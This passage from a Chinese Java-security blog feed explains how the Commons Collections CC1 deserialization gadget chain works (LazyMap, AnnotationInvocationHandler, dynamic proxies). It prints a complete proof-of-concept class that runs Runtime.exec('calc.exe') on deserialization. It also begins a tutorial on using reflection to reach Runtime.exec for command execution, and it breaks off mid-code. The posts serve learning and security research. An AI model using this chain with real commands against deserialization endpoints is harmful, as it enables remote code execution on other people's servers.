title="LazyMap"></a>LazyMap</h5><p>看到这里，你会发现，不对啊，<code>ysoserial</code>里面是<code>LazyMap</code>，而我们却没有讲到，这里讲一下</p><p>有师傅分析<code>LazyMap</code>类，里面的<code>get</code>方法正好符合<code>put</code>去调用<code>transform</code>的情况</p><blockquote><p>get方法同时还要求传入一个Object 参数，get方法内部在调用transform方法之前会先判断一下key，如果当前map中不存在key的话，则通过factory来创建一个value</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Invoke-&gt;get(LazyMap)–&gt;put(putAll),setValue—&gt;transform</p><p>同时，因为factory是LazyMap类的成员属性，其数据类型也是Transformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazyMap</span></span><br><span class="line">        <span class="keyword">extends</span> <span class="title class_">AbstractMapDecorator</span></span><br><span class="line">        <span class="keyword">implements</span> <span class="title class_">Map</span>, Serializable &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/** Serialization version */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">7990956402564206740L</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/** The factory to use to construct elements */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer factory;</span><br></pre></td></tr></table></figure><p>同时还具有我们熟悉的<code>decorate</code>方法，这个方法和之前TransformedMap中的decorate方法的用法一样，它要求接收两个参数，一个是Map，另一个是Transformer类型的factory，这意味着factory参数是可控的，我们可以通过反射或者构造方法来控制factory参数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);    &#125;</span><br></pre></td></tr></table></figure><p>LazyMap类的利用链问题解决了，但还需要一个类在反序列化的时候触发LazyMap类的get方法，因此还得借助AnnotationInvocationHandler类，通过AnnotationInvocationHandler类的构造方法将LazyMap传递给memberValues，也就是说我们要获得AnnotationInvocationHandler的构造器。</p><p>这里我们以<code>invoke()</code>方法做例子</p><p>接下来需要在AnnotationInvocationHandler中寻找哪些方法中调用了get方法，找到了Invoke方法，而且memberValues的值是可控的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> &#123;    <span class="type">Object</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.get(var4);&#125;</span><br></pre></td></tr></table></figure><h6 id="如何调用AnnotationInvocationHandler类中的invoke方法"><a href="#如何调用AnnotationInvocationHandler类中的invoke方法" class="headerlink" title="如何调用AnnotationInvocationHandler类中的invoke方法"></a>如何调用AnnotationInvocationHandler类中的invoke方法</h6><p>答案就是：<strong>通过反射将代理对象proxyMap传给AnnotationInvocationHandler的构造方法</strong></p><p>由于不是<strong>public访问权限</strong>，直接访问AnnotationInvocationHandler类是行不通的，通过分析AnnotationInvocationHandler类，发现这个类实现了InvocationHandler接口，是不是觉得InvocationHandler接口符合动态代理。</p><p>既然我们的目标是调用LazyMap类的get方法，那么可以通过Proxy类的静态方法newProxyInstance来创建LazyMap类的动态代理对象，当lazyMap调用方法时就会调用代理对象的invoke方法。</p><h6 id="代理对象"><a href="#代理对象" class="headerlink" title="代理对象"></a>代理对象</h6><p>通过分析AnnotationInvocationHandler类，发现这个类实现了InvocationHandler接口，是动态代理的接口。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">newProxyInstance</span><span class="params">(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h)</span>;</span><br></pre></td></tr></table></figure><ul><li><p>参数loader表示目标对象所属类的加载器，因此这里要传入Map的类加载器</p></li><li><p>参数interfaces表示目标对象实现的接口（通过反射获取），也就是目标对象lazyMap实现的接口，这里还是传入Map对象</p></li><li><p>参数h表示代理类要完成的功能，注意参数h的类型时InvocationHandler，因此这里我们要传入AnnotationInvocationHandler对象</p></li></ul><p>具体的话参考此<a href="https://blog.csdn.net/u012326462/article/details/81293186">https://blog.csdn.net/u012326462/article/details/81293186</a></p><p>在Spring里面，逐渐演化为AOP思想</p><h6 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h6><p>通过调试，AnnotationInvocationHandler的构造会将代理对象proxyMap赋值给成员属性memberValues </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">    Class[] var3 = var1.getInterfaces();</span><br><span class="line">    <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation.class) &#123;</span><br><span class="line">        <span class="built_in">this</span>.type = var1;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = var2;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后AnnotationInvocationHandler对象在反序列化的时候调用重写的readObject方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var2.memberTypes();</span><br><span class="line">    <span class="comment">//获取LazyMap父类的entrySet</span></span><br><span class="line">    <span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();</span><br><span class="line">    <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">        <span class="comment">//代理对象调用方法</span></span><br><span class="line">        <span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Entry)var4.next();</span><br><span class="line">        <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);</span><br><span class="line">        <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    当调用readObject方法时，memberValues的值就是代理对象proxyMap（也就是LazyMap的代理对象），只要代理对象proxyMap调用方法就会执行AnnotationInvocationHandler中的invoke方法（代理对象调用任何方法In，不管InvocationHandler的invoke方法都会进行拦截，这就是动态代理技术）</p><p>所以，我们可以构造为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.CC1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo06</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchMethodException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                        String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                        Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                        <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, transformerChain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">annotationInvocationHandler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Target.class, lazyMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), lazyMap.getClass().getInterfaces(), annotationInvocationHandler);</span><br><span class="line">        annotationInvocationHandler = (InvocationHandler) construct.newInstance(Target.class, proxyMap);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(annotationInvocationHandler);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="思路图"><a href="#思路图" class="headerlink" title="思路图"></a>思路图</h6><p><img src="https://img-blog.csdnimg.cn/20210720151853616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1NzMzNzUx,size_16,color_FFFFFF,t_70" alt="img"></p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://blog.csdn.net/WDWAGAAFGAGDADSA/article/details/122135422">https://blog.csdn.net/WDWAGAAFGAGDADSA/article/details/122135422</a></p><p><a href="https://blog.csdn.net/qq_35733751/article/details/118462281">https://blog.csdn.net/qq_35733751/article/details/118462281</a></p><p><a href="https://xz.aliyun.com/t/9873#toc-19">https://xz.aliyun.com/t/9873#toc-19</a></p>]]></content>
    
    
    <summary type="html">对CC链的调试分析</summary>
    
    
    
    <category term="java安全" scheme="https://h0ld1rs.github.io/categories/java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="java安全" scheme="https://h0ld1rs.github.io/tags/java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>java安全入门(一)</title>
    <link href="https://h0ld1rs.github.io/posts/39073.html"/>
    <id>https://h0ld1rs.github.io/posts/39073.html</id>
    <published>2022-01-13T15:46:31.000Z</published>
    <updated>2022-03-15T03:35:10.261Z</updated>
    
    <content type="html"><![CDATA[<h1 id="java安全入门-一"><a href="#java安全入门-一" class="headerlink" title="java安全入门(一)"></a>java安全入门(一)</h1><p>首先，我们需要了解java得基本语法，没有了解得同学，建议学习完java得基本语法之后，再来学习</p><h2 id="编译型语言和解释性语言"><a href="#编译型语言和解释性语言" class="headerlink" title="编译型语言和解释性语言"></a>编译型语言和解释性语言</h2><p>大家之前都或多或少接触过python与php，刚开始可能接触过一些C，但是其实这几种是不同的语言</p><ul><li>有的编程语言要求必须提前将所有源代码一次性转换成二进制指令，也就是生成一个可执行程序（Windows 下的 .exe），比如C语言、C++、Golang、Pascal（Delphi）、汇编等，这种编程语言称为编译型语言，使用的转换工具称为编译器</li><li>有的编程语言可以一边执行一边转换，需要哪些源代码就转换哪些源代码，不会生成可执行程序，比如 Python、JavaScript、PHP、Shell、MATLAB等，这种编程语言称为解释型语言，使用的转换工具称为解释器。</li></ul><blockquote><p>简单理解，编译器就是一个“翻译工具”，类似于将中文翻译成英文、将英文翻译成俄文。但是，翻译源代码是一个复杂的过程，大致包括词法分析、语法分析、语义分析、性能优化、生成可执行文件等五个步骤，期间涉及到复杂的算法和硬件架构。解释器也是一样，可以参考《编译原理》</p></blockquote><p>但是，我们要学的<code>java</code>和<code>c#</code>属于<code>半编译半解释型</code>的语言，</p><p>根据这种特性，源代码需要先转换成一种中间文件（字节码文件），然后再将中间文件拿到虚拟机中执行。Java 引领了这种风潮，它的初衷是在跨平台的同时兼顾执行效率；C# 是后来的跟随者，但是 C# 一直止步于 Windows 平台。</p><p>下面用一张图来说明一下</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220315113458.png"></p><p>我们学习php的时候，最核心的一步其实是命令执行，只有RCE成功，我们才算真正拿下了这台主机，所以，java这里，我们先学习一下命令执行。</p><h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><h3 id="我们为什么必须使用反射"><a href="#我们为什么必须使用反射" class="headerlink" title="我们为什么必须使用反射"></a>我们为什么必须使用反射</h3><p>回想一下 java 中的基本操作，我们可以知道，类是对象的模板，对象是类的实例。一般我们都使用new的方式来创建一个对象，比如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Student</span> <span class="variable">stu1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line"><span class="comment">//假设定义类之后，进行无参构造</span></span><br></pre></td></tr></table></figure><p>那么，反射，为什么需要反射呢？</p><blockquote><p>java有四个基本特征，封装，继承，多态，抽象</p><p>Java的反射（reflection）机制是指在程序的运行状态中，可以构造任意一个类的对象，可以了解任意一个对象所属的类，可以了解任意一个类的成员变量和方法，可以调用任意一个对象的属性和方法。本质上其实就是动态的生成类似于上述的字节码，加载到jvm中运行</p></blockquote><p><strong>关键点：动态获取</strong></p><h3 id="反射获取对象"><a href="#反射获取对象" class="headerlink" title="反射获取对象"></a>反射获取对象</h3><p>正常的new对象的过程如下，我们可以看到，首先编译出了Student的类，而Student.class 经过JVM的内存中，就始终存在一个（一个类只会存在一个class对象），</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220115014839.png"></p><p>补一张jvm的图</p><p><img src="https://pic4.zhimg.com/80/v2-4face8109e0d52ef5894c41c69e4ec6b_hd.jpg" alt="img"></p><p>双亲委派机制</p><p>1-&gt;2-&gt;3-&gt;4</p><p>由于java语言动态的特性，在程序运行后，所运行的类，就已经在JVM的内存中，我们就可以直接调用已经加载好的类去实现我们的方法操作。</p><blockquote><p>在很大一部分情况下，公司上线的产品都是以jar包或者war包部署到Tomcat下运行的，我们如果有源码，能审查链以后，就可以直接利用加载在JVM中的类进行操作。</p></blockquote><ol><li>Java反射机制的核心是在程序运行时动态加载类并获取类的详细信息，从而操作类或对象的属性和方法。本质是JVM得到class对象之后，再通过class对象进行反编译，从而获取对象的各种信息。</li><li>Java属于&#x3D;&#x3D;先编译再运行&#x3D;&#x3D;的语言，程序中对象的类型在编译期就确定下来了，而当程序在运行时可能需要动态加载某些类，这些类因为之前用不到，所以没有被加载到JVM。通过反射，可以在运行时动态地创建对象并调用其属性，不需要提前在编译期知道运行的对象是谁。</li><li><strong>反射调用方法时，会忽略权限检查</strong>，可以无视权限修改对应的值—&gt;因此容易导致安全性问题，（对安全研究人员来说提供了不小的帮助，hhhh）</li></ol><h3 id="反射举例"><a href="#反射举例" class="headerlink" title="反射举例"></a>反射举例</h3><p>我们最常见的反射举例，是加载数据库驱动时的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);<span class="comment">//动态加载JDBC驱动</span></span><br><span class="line"><span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(url, user, password);</span><br></pre></td></tr></table></figure><h4 id="反射常用的方法有"><a href="#反射常用的方法有" class="headerlink" title="反射常用的方法有"></a>反射常用的方法有</h4><p>Java.lang.Class;</p><p>Java.lang.reflect.Constructor;</p><p>Java.lang.reflect.Field;</p><p>Java.lang.reflect.Method;</p><p>Java.lang.reflect.Modifier;</p><h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h4><h5 id="获得Class"><a href="#获得Class" class="headerlink" title="获得Class"></a>获得Class</h5><ul><li>类名.class，如:com.student.Student.class。</li><li>ClassLoader.getSystemClassLoader().loadClass(“com.student.Student”)</li><li>Class.forName(“com.student.Student”)</li></ul><p>于是乎，我们通过反射可以这样获取<code>Runtime</code>类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">className</span>     <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime&quot;</span>;</span><br><span class="line"><span class="type">Class</span>  <span class="variable">runtimeClass1</span> <span class="operator">=</span> Class.forName(className);</span><br><span class="line"><span class="type">Class</span>  <span class="variable">runtimeClass2</span> <span class="operator">=</span> java.lang.Runtime.class;</span><br><span class="line"><span class="type">Class</span>  <span class="variable">runtimeClass3</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader().loadClass(className);</span><br></pre></td></tr></table></figure><h5 id="获取构造器"><a href="#获取构造器" class="headerlink" title="获取构造器"></a>获取构造器</h5><p>这里，有两个方法</p><ul><li>getDeclaredConstructor()</li><li>getConstructor()</li></ul><p>其中，getDeclaredConstructor()可以获得构造方法，也就是我们常用的<code>private</code>方法，其中Runtime的构造方法是<code>private</code>，我们无法直接调用，我们需要使用反射去修改方法的访问权限（使用<code>setAccessible</code>，修改为 true）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> runtimeClass1.getDeclaredConstructor();</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><h5 id="通过获取的构造器进行实例化对象"><a href="#通过获取的构造器进行实例化对象" class="headerlink" title="通过获取的构造器进行实例化对象"></a>通过获取的构造器进行实例化对象</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Object类是所有类的父类，有兴趣的同学可以在双亲委派机制中去搞明白</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">runtimeInstance</span> <span class="operator">=</span> constructor.newInstance();</span><br><span class="line"><span class="comment">//这里的话就等价于</span></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Runtime</span>();</span><br></pre></td></tr></table></figure><h5 id="获取方法"><a href="#获取方法" class="headerlink" title="获取方法"></a>获取方法</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">runtimeMethod</span> <span class="operator">=</span> runtimeClass1.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br></pre></td></tr></table></figure><blockquote><p>当我们想获取当前类的所有成员方法时们可以使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Method[] methods = class.getDeclaredMethods()</span><br></pre></td></tr></table></figure><p>获取当前类指定的成员方法时，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> class.getDeclaredMethod(<span class="string">&quot;方法名&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> class.getDeclaredMethod(<span class="string">&quot;方法名&quot;</span>, 参数类型如String.class，多个参数用<span class="string">&quot;,&quot;</span>号隔开);</span><br></pre></td></tr></table></figure></blockquote><h5 id="执行方法"><a href="#执行方法" class="headerlink" title="执行方法"></a>执行方法</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> (Process) runtimeMethod.invoke(runtimeInstance, <span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure><p>这里简单解释一下 invoke方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">method.invoke(方法实例对象, 方法参数值，多个参数值用<span class="string">&quot;,&quot;</span>隔开);</span><br></pre></td></tr></table></figure><blockquote><ol><li>invoke就是调用类中的方法，最简单的用法是可以把方法参数化invoke(class, method)</li></ol><p> 这里则是使用了 class.invoke(method,”参数”)的一个方式</p><ol start="2"><li>还可以把方法名存进数组v[],然后循环里invoke(test,v[i]),就顺序调用了全部方法</li></ol><p> （之后会介绍）</p></blockquote><h5 id="回显结果，不需要回显的话就忽略"><a href="#回显结果，不需要回显的话就忽略" class="headerlink" title="回显结果，不需要回显的话就忽略"></a>回显结果，不需要回显的话就忽略</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">      <span class="type">InputStreamReader</span> <span class="variable">inputStreamReader</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(inputStream);</span><br><span class="line">      <span class="type">BufferedReader</span> <span class="variable">inputBufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(inputStreamReader);</span><br><span class="line">      StringBuilder stringBuilder=<span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">      <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">      <span class="keyword">while</span> ((line = inputBufferedReader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">          stringBuilder.append(line);</span><br><span class="line">          System.out.println(line);</span><br><span class="line">      &#125;</span><br><span class="line">      inputBufferedReader.close();</span><br><span class="line">      inputStreamReader.close();</span><br><span class="line">      inputStream.close();</span><br></pre></td></tr></table></figure><h5 id="获取成员变量-Demo中没有用到"><a href="#获取成员变量-Demo中没有用到" class="headerlink" title="获取成员变量(Demo中没有用到)"></a>获取成员变量(Demo中没有用到)</h5><p>反射还可以对成员变量进行操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取类中的成员们变量</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">fields</span> <span class="operator">=</span> class.getDeclaredFields();</span><br><span class="line"><span class="comment">//获取当前类指定的成员变量</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> 